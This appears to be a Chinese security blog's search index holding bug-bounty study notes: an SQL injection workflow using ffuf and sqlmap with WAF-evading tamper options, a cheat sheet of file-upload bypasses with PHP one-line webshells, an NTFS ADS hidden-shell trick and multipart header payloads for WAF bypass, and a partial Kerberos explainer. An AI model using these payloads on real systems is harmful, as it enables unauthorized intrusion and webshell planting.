<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>如何快速挖掘sql注入漏洞</title>
      <link href="/2022/10/24/dig_sql/"/>
      <url>/2022/10/24/dig_sql/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>在一个平台上看到国外小哥的一篇文章，如何快速挖到sql注入漏洞：<a href="https://0xmahmoudjo0.medium.com/how-i-found-multiple-sql-injection-with-ffuf-and-sqlmap-in-a-few-minutes-9c3bb3780e8f%EF%BC%8C%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%B8%8B%E6%80%9D%E8%B7%AF">https://0xmahmoudjo0.medium.com/how-i-found-multiple-sql-injection-with-ffuf-and-sqlmap-in-a-few-minutes-9c3bb3780e8f，学习一下思路</a></p><h3 id="0x01-思路">0x01 思路</h3><p>第一步，使用waybackurls工具爬去网页的所有链接，可以添加筛选的条件，uro是一个删除重复网址的工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waybackurls https://redacted.org/ | uro | grep “.php” &gt; php-files.txt</span><br></pre></td></tr></table></figure><p>第二步，发现PHP文件名看起来很有趣，由get开头，尝试制作参数字典，进行一系列的处理</p><img src="/2022/10/24/dig_sql/image-20221024163646131.png" alt="image-20221024163646131" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat php-files.txt| grep -i get | sed ‘s/.*.get//’ | sort -u</span><br></pre></td></tr></table></figure><p>只需要 grep 包含<em>get</em>字符串的行并删除它之前的所有行并使其唯一以避免重复</p><img src="/2022/10/24/dig_sql/image-20221024163401237.png" alt="image-20221024163401237" style="zoom:50%;"><p>但我们应该删除 .php 字符串来创建一个列表，所以我只是将这一行添加到最后一个命令cut -f1 -d”.”</p><img src="/2022/10/24/dig_sql/image-20221024163551787.png" alt="image-20221024163551787" style="zoom:50%;"><p>我注意到我所有的字符串都包含两个单词，我不知道它们中的哪个是参数，所以让我们拆分它</p><p>如何在一行中找到大写字母，并拆分成行    sed ‘s/[AZ]+/\n&amp;/g’</p><img src="/2022/10/24/dig_sql/image-20221024163949891.png" alt="image-20221024163949891" style="zoom:50%;"><p>认为大多数参数都是小写的，而不是大写的，所以我将其保留为大写参数并将其转换为小写</p><img src="/2022/10/24/dig_sql/image-20221024164005355.png" alt="image-20221024164005355" style="zoom:50%;"><p>第三步，使用ffuf去fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w lowercase-parameters.txt -u &quot;https://redacted.org/searchProgressCommitment.php?FUZZ=5&quot;</span><br></pre></td></tr></table></figure><p>get 请求没结果，尝试转换post请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w lowercase-parameters.txt -X POST -d &quot;FUZZ=5&quot; -u &quot;https://redacted.org/searchProgressCommitment.php&quot;</span><br></pre></td></tr></table></figure><p>第四步，使用sqlmap去跑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms=”MYSQL” --hostname --current-user --current-db --dbs --tamper=between --no-cast</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--level 5 --&gt; Level of tests to perform.</span><br><span class="line">--risk 3 --&gt; Risk of tests to perform</span><br><span class="line">--dbms --&gt; back-end DBMS value</span><br><span class="line">--no-cast --&gt; to avoid use cast-alike statements during data fetching</span><br><span class="line">--tamper --&gt; to evade filters and WAF’s</span><br><span class="line">&quot;--hostname --current-user --current-db --dbs&quot; --&gt; to retrieve info about the database</span><br></pre></td></tr></table></figure><img src="/2022/10/24/dig_sql/image-20221024164202234.png" alt="image-20221024164202234" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> 赏金 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sql注入 </tag>
            
            <tag> ffuf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于文件上传的一些总结</title>
      <link href="/2022/10/21/fileupload/"/>
      <url>/2022/10/21/fileupload/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>看到国外老哥利用文件上传绕过，获得2w美元的赏金，深感挫败。重新总结一下文件上传的知识点，顺便记录一下，以便以后的查找。老哥的文章：<a href="https://twitter.com/GodfatherOrwa/status/1582760830252511233%E3%80%82">https://twitter.com/GodfatherOrwa/status/1582760830252511233。</a></p><h3 id="0x01-文件上传校验姿势">0x01 文件上传校验姿势</h3><h4 id="客户端javascript校验">客户端javascript校验</h4><p>一般都是用javascript脚本检验上传文件的后缀。</p><h4 id="服务端校验">服务端校验</h4><ul><li><p>文件类型校验，其实就是文件头content-type字段校验（image/gif）</p></li><li><p>文件内容头校验（GIF89a）</p><p>主要是检测文件内容开始处的文件幻数</p></li><li><p>后缀名黑名单校验</p></li><li><p>后缀名白名单校验</p></li><li><p>自定义正则校验</p></li><li><p>WAF设备校验（根据不同的WAF产品而定）</p></li></ul><h3 id="0x02-文件上传绕过校验姿势">0x02 文件上传绕过校验姿势</h3><h4 id="客户端绕过">客户端绕过</h4><p>可以利用burp等抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p><h4 id="服务端绕过">服务端绕过</h4><ul><li>文件类型绕过</li></ul><p>抓包改Content-type字段<br>比如通过抓包，将content-type字段改为image/gif</p><ul><li>文件内容头绕过</li></ul><p>在木马文件内容开头加上一些文件头信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.JPEG;.JPE;.JPG，”JPGGraphic File”</span><br><span class="line">.gif，”GIF 89A”</span><br><span class="line">.zip，”Zip Compressed”</span><br><span class="line">.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</span><br></pre></td></tr></table></figure><ul><li><p>文件名/后缀绕过</p><ul><li><p>截断</p><p>test.php%00.jpg</p><p>test.php0xoo.jpg</p><p>burp抓包，修改hex的值为00，也称00截断</p></li><li><p>windows特性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ADS流：test.php::$DATA(见下)</span><br><span class="line">test.php.</span><br><span class="line">test.php_</span><br><span class="line">test.php(空格)</span><br><span class="line">*=.</span><br><span class="line">&lt;=*</span><br><span class="line">&gt;=?</span><br><span class="line">test.&lt;&lt;&lt;</span><br><span class="line">test.php:1.jpg会生成一个test.php的空文件</span><br></pre></td></tr></table></figure></li><li><p>ASP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">解析漏洞:</span><br><span class="line">.asp;.jpg</span><br><span class="line">.asp.jpg</span><br><span class="line">.asp;jpg</span><br><span class="line">+111.asp;+222.jpg</span><br><span class="line">/111.asp/1.jpg</span><br><span class="line">/111.aspx/1.jpg</span><br><span class="line">后缀名：</span><br><span class="line">asa,cer,cdx,ashx,asmx,xml,htr,asax</span><br><span class="line">双文件扩展：</span><br><span class="line">test.asp.jpg</span><br><span class="line">RTLO：</span><br><span class="line">asp.html-内容为一句话</span><br><span class="line">php.txt-内容为一句话</span><br></pre></td></tr></table></figure></li><li><p>JSP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.jsp.jpg.jsp-用两个jsp包围中间的jpg</span><br><span class="line">后缀名：jspf,jspa,jsps</span><br></pre></td></tr></table></figure></li><li><p>PHP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">后缀名：.php3 ,.php5,.php7</span><br><span class="line">大小写：pHp</span><br><span class="line">解析漏洞：</span><br><span class="line">1.php.jpg</span><br><span class="line">1.jpg.php</span><br><span class="line">1.php  jpg(jpg前面两个空格)</span><br><span class="line">1.php jpg(jpg前面一个空格)</span><br><span class="line">/1.jpg/1.php</span><br><span class="line">/1.jpg%00.php</span><br><span class="line">/1.jpg/.php</span><br><span class="line">/1.jpg/php</span><br><span class="line">特殊文件利用：</span><br><span class="line">.htaccess</span><br><span class="line">.user.ini</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="配合文件包含漏洞">配合文件包含漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.上传一个符合条件格式的文档，文档内容为一句话木马，eg：test.txt</span><br><span class="line">b.利用文件包含漏洞包含上传的木马文件,eg:page?id=D:/www/test.txt</span><br></pre></td></tr></table></figure><h4 id="配合服务器解析漏洞">配合服务器解析漏洞</h4><ul><li><p>IIS 5.x/6.0解析漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IIS5.x-6.x:</span><br><span class="line">1、目录解析(6.0):/1.asp/1.jpg 在此目录下的任意文件，服务器都解析为asp文件</span><br><span class="line">2、文件解析:1.asp;.jpg</span><br><span class="line">3、文件类型:1.asa,a.cer,1.cdx</span><br><span class="line"></span><br><span class="line">IIS7.5：</span><br><span class="line">IIS7.5是由于php配置文件中，开启了cgi.fix_pathinf</span><br></pre></td></tr></table></figure></li><li><p>Apache解析漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断</span><br><span class="line">后缀不识别：1.php.php123</span><br><span class="line">配置错误：1.php.jpg</span><br></pre></td></tr></table></figure></li><li><p>Nginx解析漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nginx默认是以CGI的方式支持PHP解析的，和IIS7.5一样开启了cgi.fix_pathinf</span><br><span class="line">1.jpg/1.php</span><br><span class="line">1.jpg%00.php</span><br><span class="line">1.jpg/%20\1.php</span><br><span class="line">上传一个名字为test.jpg，以下内容的文件</span><br><span class="line">‘);?&gt;</span><br><span class="line">然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php</span><br></pre></td></tr></table></figure></li></ul><h4 id="配合操作系统文件命令规则">配合操作系统文件命令规则</h4><ul><li><p>上传不符合windows文件命名规则的文件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test.asp.</span><br><span class="line">test.asp(空格)</span><br><span class="line">test.php:1.jpg</span><br><span class="line">test.php::$DATA</span><br><span class="line">shell.php::$DATA…….</span><br><span class="line">会被windows系统自动去掉不符合规则符号后面的内容。</span><br></pre></td></tr></table></figure></li><li><p>linux下后缀名大小写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</span><br></pre></td></tr></table></figure></li></ul><h4 id="CMS、编辑器漏洞">CMS、编辑器漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CMS漏洞：针对不同CMS存在的上传漏洞进行绕过。</span><br><span class="line">编辑器漏洞：比如FCK，Ewebeditor等，可以针对编辑器的漏洞进行绕过。</span><br></pre></td></tr></table></figure><h4 id="其他规则">其他规则</h4><ul><li><p>利用WAF特性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">在恶意代码前加垃圾数据；</span><br><span class="line">在数据包前加垃圾数据；</span><br><span class="line">在Content-Disposition参数后面加垃圾数据；</span><br><span class="line">多加一个filename；</span><br><span class="line">更改HTTP请求方法；</span><br><span class="line">删除实体里面的Conten-Type字段；</span><br><span class="line">第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</span><br><span class="line">删除Content-Disposition字段里的空格</span><br><span class="line">增加一个空格</span><br><span class="line">修改Content-Disposition字段值的大小写</span><br><span class="line">文件名后缀处回车</span><br><span class="line">多个Content-Disposition</span><br></pre></td></tr></table></figure></li><li><p>利用NTFS ADS特性</p><p>DS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test.php:a.jpg　　　　　　　　　生成test.php  空</span><br><span class="line">test.php::$INDEX_ALLOCATION  生成test.php文件夹  </span><br><span class="line">test.php::$DATA\1.jpg  　　　生成1.jpg(不可见的)</span><br><span class="line">echo ^&lt;?php @eval(request[caidao])?^&gt;  &gt; index.php:hidden.jpg</span><br><span class="line">这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。我们可以在另外一个正常文件里把这个ADS文件include进去，&lt;?php include(‘index.php:hidden.jpg’)?&gt;，这样子就可以正常解析我们的一句话了</span><br></pre></td></tr></table></figure></li><li><p>利用RTLO</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">新建一个文件php.html</span><br><span class="line">内容为：&lt;?php @eval($_POST[&#x27;caidao&#x27;]);?&gt;</span><br><span class="line">重命名文件：输入名字的文本框里点右键，选择“插入unicode控制字符”，然后就到了这个菜单栏，我们选择RLO</span><br><span class="line">这个时候php.html已经变成了html.php了</span><br></pre></td></tr></table></figure></li><li><p>特殊的长文件名绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件名使用非字母数字，比如中文等最大程度的拉长</span><br><span class="line">shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</span><br></pre></td></tr></table></figure></li><li><p>反删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将name=”file1”改成了file4，可以防止文件删除（JCMS漏洞）</span><br></pre></td></tr></table></figure></li><li><p>图片转换/二次渲染/文件幻数检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在不破坏文件本身渲染情况下，在空白区进行代码填充，一般是图片注释</span><br><span class="line">溢出攻击</span><br><span class="line">绕过GD库</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x03-WAF-Bypass">0x03 WAF Bypass</h3><p>WAF如何拦截？</p><ul><li>解析文件名，判断是否在黑名单内。</li><li>解析文件内容，判断是否为webshell。</li><li>文件目录权限</li></ul><p>目前，市面上常见的是解析文件名，少数WAF是解析文件内容，比如长亭。下面内容，都是基于文件名解析。</p><h4 id="垃圾数据">垃圾数据</h4><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。</p><ul><li><p>构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验</p><img src="/2022/10/21/fileupload/image-20221021152925545.png" alt="image-20221021152925545" style="zoom:50%;"></li><li><p>将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验</p><img src="/2022/10/21/fileupload/image-20221021153052502.png" alt="image-20221021153052502" style="zoom:50%;"></li><li><p>将垃圾数据加到Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错</p></li></ul><h4 id="多个filename">多个filename</h4><p>早期版本安全狗，可以多加一个filename</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure><p>最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</p><h4 id="交换name和filename的顺序">交换name和filename的顺序</h4><p>规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; filename=&quot;xx.php&quot;; name=file_x</span><br></pre></td></tr></table></figure><h4 id="去掉引号-双引号变成单引号">去掉引号,双引号变成单引号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=file_x; filename=&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: form-data; name=file_x; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=&#x27;file_x&#x27;; filename=&#x27;xx.php&#x27;</span><br></pre></td></tr></table></figure><p>单引号、双引号、不要引号，都能上传。</p><h4 id="大小写">大小写</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">对这三个固定的字符串进行大小写转换</span><br><span class="line"></span><br><span class="line">Content-Disposition</span><br><span class="line">name</span><br><span class="line">filename</span><br><span class="line"></span><br><span class="line">空格</span><br><span class="line">在: ; =添加1个或者多个空格。</span><br></pre></td></tr></table></figure><h4 id="去掉或修改Content-Disposition值">去掉或修改Content-Disposition值</h4><p>有的WAF在解析的时候，认为Content-Disposition值一定是form-data，造成绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name=&#x27;file_x&#x27;; filename=&#x27;xx.php&#x27;</span><br></pre></td></tr></table></figure><h4 id="多个boundary">多个boundary</h4><p>最后上传的文件是test.php而非test.txt，但是取的文件名只取了第一个就会被Bypass。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;</span><br><span class="line">Content-Type: text/javascript</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.php&quot;</span><br><span class="line">Content-Type: text/javascript</span><br></pre></td></tr></table></figure><h4 id="多个分号">多个分号</h4><p>文件解析时，可能解析不到文件名，导致绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;;;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure><h4 id="Header在boundary前添加任意字符">Header在boundary前添加任意字符</h4><p>PHP支持，JAVA报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br></pre></td></tr></table></figure><h4 id="filename换行">filename换行</h4><p>PHP支持，Java不支持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; file</span><br><span class="line">name=&quot;test.php&quot;</span><br></pre></td></tr></table></figure><h4 id="name和filename添加任意字符串">name和filename添加任意字符串</h4><p>PHP支持，Java不支持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name=&quot;file_x&quot;; bypass waf upload; filename=&quot;test.php&quot;;</span><br></pre></td></tr></table></figure><h4 id="POST-GET">POST/GET</h4><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赏金 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>说说</title>
      <link href="/2022/10/20/say/"/>
      <url>/2022/10/20/say/</url>
      
        <content type="html"><![CDATA[<p>2022.10.21</p><ul><li>如果没有经济基础，打一个喷嚏，对于爱情来说，就是地震</li><li>know it and hack it</li></ul><p>2022.10.20</p><ul><li>没有得到，何必患得患失</li><li>与国内黑客同台竞技？与国际黑客同台竞技？</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 说说 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解kerberos认证原理</title>
      <link href="/2022/10/19/kerberos/"/>
      <url>/2022/10/19/kerberos/</url>
      
        <content type="html"><![CDATA[<h3 id="前言">前言</h3><p>Kerberos协议是一个专注于验证通信双方身份的网络协议，不同于其他网络安全协议的保证整个通信过程的传输安全，kerberos侧重于通信前双方身份的认定工作，帮助客户端和服务端解决“证明我自己是我自己”的问题，从而使得通信两端能够完全信任对方身份，在一个不安全的网络中完成一次安全的身份认证继而进行安全的通信。</p><h3 id="什么是Kerberos协议">什么是Kerberos协议</h3><p>kerberos是一种计算机网络认证协议，他能够为网络中通信的双方提供严格的身份验证服务，确保通信双方身份的真实性和安全性。不同于其他网络服务，kerberos协议中不是所有的客户端向想要访问的网络服务发起请求，他就能够建立连接然后进行加密通信。而是在发起服务请求后必须先进行一系列的身份认证，包括客户端和服务端两方的双向认证，只有当通信双方都认证通过对方身份之后，才可以互相建立起连接，进行网络通信。即kerberos协议的侧重在于认证通信双方的身份，客户端需要确认即将访问的网络服务就是自己所想要访问的服务而不是一个伪造的服务器，而服务端需要确认这个客户端是一个身份真实，安全可靠的客户端，而不是一个想要进行恶意网络攻击的用户。本文将详细概述kerberos认证原理，讲述通信双方是如何一步步确认对方身份完成认证的。</p><h3 id="Kerberos协议的组成角色">Kerberos协议的组成角色</h3><p>在古希腊神话故事中，kerberos是一只具有三颗头颅的地狱恶犬，他守护在地狱之外，能够识别所有经此路过的亡灵，防止活着的入侵者闯入地狱。而真正的kerberos协议中也存在三个角色，分别是</p><ul><li><strong>客户端（client）</strong>：发送请求的一方</li><li><strong>服务端（Server）</strong>：接收请求的一方</li><li>密钥分发中心（Key Distribution Center，KDC），而密钥分发中心一般又分为两部分，分别是：<ul><li><strong>AS（Authentication Server）</strong>：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（票据授予票据）</li><li><strong>TGS（Ticket Granting Server）</strong>：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据（ST）</li></ul></li></ul><p>在整个kerberos认证过程中，三个角色缺一不可，下面便来介绍一下整个kerberos的认证原理</p><h3 id="Kerberos认证解决”如何证明我就是我的问题“">Kerberos认证解决”如何证明我就是我的问题“</h3><p>上面说到了kerberos协议当中总共有三个不同的角色，客户端和服务端就不用多说了，一个是请求的发起者一个是请求的接收者，那么KDC是做什么的呢？答案是这样的~<br>在kerberos协议中，通信的双方在通信之前必须相互证明自己的身份是可靠并且具有访问权限的（后面会说为什么是要具有访问权限的），那么双方都要如何证明自己呢？口说无凭，客户端的请求中携带自己的身份信息直接给服务端，服务端是没有理由直接信任这段信息就是真实的信息的，同理，服务端返回自己的身份信息给客户端，客户端也同样是无法辨别该服务器是否是自己想要访问的服务器。</p><p>举个例子，A现在想要去访问B完成一个任务。但是AB两人之间是从来没有见过面的，他们只知道对方的名字叫A，B。此时如果A直接去找B告诉B我就是A，那么B是有理由不相信A的，因为即使A是一个冒充的他也分辨不清，B同理也得不到A的认可，他们陷入了一个无<br>法证明我就是我的困境。于是他们就想到了一个办法，AB找到了一个他俩共同信任的人C，且这个C既认识A又认识B，所以只要C告诉B，这个A确实就是真正的A那么B就会信任这个A，同理B经过C的认可后，A也会相信B的身份。此后，A在访问B之前会先去找C，C会交给A一个凭证，代表此时的A已经得到了C的认证，这时A拿着凭证再去找C，便可以得到C的确认了。</p><p>在上面的例子中，A，B分别是客户端和服务端，C担任的角色便是<strong>KDC</strong>，全称Key Distribution Center，中文名叫做密钥分发中心。KDC中包含一个叫做TGS（票据授予中心）的组件，我们便可以理解为他就是一个发放身份认证票据的服务中心，在KDC认证了（其实是KDC中的AS认证的）客户端的身份后，他会给客户端发放用于访问网络服务的服务授予票据（Ticket）。由于整个kerberos通信过程都采用对称加密的方式，密钥的获取也是从KDC中得到，所以KDC叫做密钥分发中心。</p><p><strong>所以整个kerberos认证流程可以简化描述如下：</strong><br>客户端在访问每个想要访问的网络服务时，他需要携带一个专门用于访问该服务并且能够证明自己身份的票据，当服务端收到了该票据他才能认定客户端身份正确，向客户端提供服务。所以整个认证流程可简化为两大步：</p><ol><li>客户端向KDC请求获取想要访问的目标服务的服务授予票据（ST）；</li><li>客户端拿着从KDC获取的服务授予票据（ST）访问相应的网络服务；</li></ol><p>简化认证流程图：</p><img src="/2022/10/19/kerberos/image-20221019173439551.png" alt="image-20221019173439551" style="zoom:50%;"><h3 id="Kerberos认证流程">Kerberos认证流程</h3><p>上面说到了简化版的Kerberos认证流程，基本上分为两步。第一步，客户端向KDC请求获得他想要访问的服务的服务授予票据（可以想象成去动物园，想去买一张能够进入动物园的门票）。第二步，拿着这张服务授予票据（Ticket）去访问服务端的服务。<br>大致的过程确实可以看作这两步，但其中还存在一些问题：<br><strong>问题1. KDC怎么知道你（客户端）就是真正的客户端？凭什么给你发放服务授予票据（Ticket）呢？</strong><br><strong>问题2. 服务端怎么知道你带来的服务授予票据（Ticket）就是一张真正的票据呢？</strong><br>这就需要开始细节的描述一下整个Kerberos认证的过程了~<br>上面提到整个流程可以简化为两大步，但其实在第一步中共做了两件事，这两件事解决了上述问题中的问题1；然后第二步解决了问题2，最终结束认证过程建立通信。<strong>所以整个Kerberos认证流程可以细化为三个阶段也可以</strong><br><strong>理解为三次通信</strong>!接下来从三个阶段三次通信的角度细说认证过程。</p><p>在具体描述整个认证流程之前，我们需要知道几个Kerberos认证的前提条件：</p><ol><li>kerberos协议他是一个“限权”的认证协议，kerberos中会自带一个数据库，这个数据库会由创建kerberos的运维人员提前在库中添加好整个系统中拥有使用kerberos认证权限的用户和网络服务。在后续的认证中也是根据数据库中是否存在该用户和服务来判断该对象是否能够通过认证服务的。（拿上面的例子来说就是上帝先让C在AB相识之前同时认识A和B，以便后面帮助AB互相认证）</li><li>所有使用kerberos协议的用户和网络服务，在他们添加进kerberos系统中时，都会根据自己当前的密码（用户密码，人为对网络服务随机生成的密码）生成一把密钥存储在kerberos数据库中，且kerberos数据库也会同时保存用户的基本信息（例如用户名，用户IP地址等）和网络服务的基本信息（IP，Server Name）</li><li>kerberos中存在的三个角色，只要是发生了两两之间的通信，那么都需要先进行身份的认证</li></ol><h3 